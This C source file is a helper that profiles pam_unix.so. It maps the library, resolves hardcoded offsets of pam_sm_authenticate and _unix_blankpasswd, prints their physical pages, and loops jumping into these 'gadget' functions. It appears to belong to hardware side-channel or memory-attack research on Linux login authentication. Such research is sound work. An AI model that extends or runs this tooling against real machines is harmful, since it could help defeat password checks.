/*
 * Ping pong for pam_unix.so profiling
 */
#define _GNU_SOURCE

#include <stdio.h>
#include <unistd.h>
#include <fcntl.h>

#include <sys/mman.h>
#include "virt_to_phy.h"

#define TOUCH_PAGE(page)   *((volatile char *)page)

/*
* Compute these offsets manually
*/
#define PAM_UNIX_SO "/lib/x86_64-linux-gnu/security/pam_unix.so"
const unsigned long pam_sm_authenticate = 0x00007770;
const unsigned long _unix_blankpasswd = 0x00005a0f;

int main(int argc, char** argv)
{
	char* error;
	int fd;
	unsigned char* so_base = 0;
	unsigned long addr;
	char* name;

	if (argc == 1)
	{
		name = PAM_UNIX_SO;
	}
	else
	{
		name = argv[1];
	}
	printf("using so: %s\n", name);

	fd = open(name, O_RDONLY);

	if (fd < 3)
	{
		printf("open failed\n");
		return 2;
	}
	so_base = (unsigned char*)mmap(0, 64 * 1024 * 1024,
		PROT_READ | PROT_EXEC, MAP_SHARED, fd, 0);

	if (so_base == (void*)-1)
	{
		printf("mmap failed\n");
		return 3;
	}

	int is_root = geteuid() == 0;
	unsigned long addr_unix_blankpasswd = (unsigned long)so_base + _unix_blankpasswd;
	unsigned long addr_pam_sm_authenticate = (unsigned long)so_base + pam_sm_authenticate;
	unsigned long paddr;

	TOUCH_PAGE(addr_unix_blankpasswd);
	TOUCH_PAGE(addr_pam_sm_authenticate);
	TOUCH_PAGE(main);

	if (is_root)
	{
		virt_to_phys_user(&paddr, (uintptr_t)addr_pam_sm_authenticate);

		printf("addr_pam_sm_authenticate phys_page: \t0x%016lx | virt_addr: 0x%016lx\n",
			paddr, (uintptr_t)addr_pam_sm_authenticate);

		virt_to_phys_user(&paddr, (uintptr_t)addr_unix_blankpasswd);

		printf("addr_unix_blankpasswd phys_page: \t0x%016lx | virt_addr: 0x%016lx\n",
			paddr, (uintptr_t)addr_unix_blankpasswd);

		virt_to_phys_user(&paddr, (uintptr_t)main);

		printf("main phys_page: \t0x%016lx | virt_addr: 0x%016lx\n",
			paddr, (uintptr_t)main);

	}
	printf("Profiling gadget pages 'addr_pam_sm_authenticate', 'addr_unix_blankpasswd' ... \n");

	while (1)
	{
		asm volatile("push %0" : : "r" (&&done));
		asm volatile("jmp *%0" : : "r" (addr_pam_sm_authenticate));
	done:
		asm volatile("mfence":: :"memory");
		asm volatile("push %0" : : "r" (&&done_exempt));
		asm volatile("jmp *%0" : : "r" (addr_unix_blankpasswd));
	done_exempt:
		asm volatile("mfence":: :"memory");
	}
	return 0;
}